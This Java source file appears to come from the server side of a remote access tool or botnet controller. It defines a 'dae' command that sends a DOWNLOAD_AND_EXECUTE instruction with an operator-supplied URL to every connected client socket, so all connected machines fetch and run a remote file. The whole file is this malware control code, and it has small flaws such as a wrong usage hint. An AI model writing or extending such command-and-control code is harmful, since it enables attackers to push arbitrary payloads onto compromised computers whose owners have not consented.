package net.vitox.command.commands;

import net.vitox.Main;
import net.vitox.command.Command;
import net.vitox.user.User;
import net.vitox.user.UserHandler;
import net.vitox.utils.SendUtil;

public class DownloadAndExecuteCommand extends Command {

    public DownloadAndExecuteCommand() {
        super("dae", "Download and Execute an file.");
    }

    @Override
    public void runCommand(String[] args) {
        try {

            if (args.length < 2) {
                System.out.println("Missing arguments! .dac <url>");
            }

            for (User user : UserHandler.userList) {
                SendUtil.getInstance().writeMsg("DOWNLOAD_AND_EXECUTE" + Main.TRIM_CHAR + args[1], user.getSocket());
            }

            System.out.println("Succesfully sent command.");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
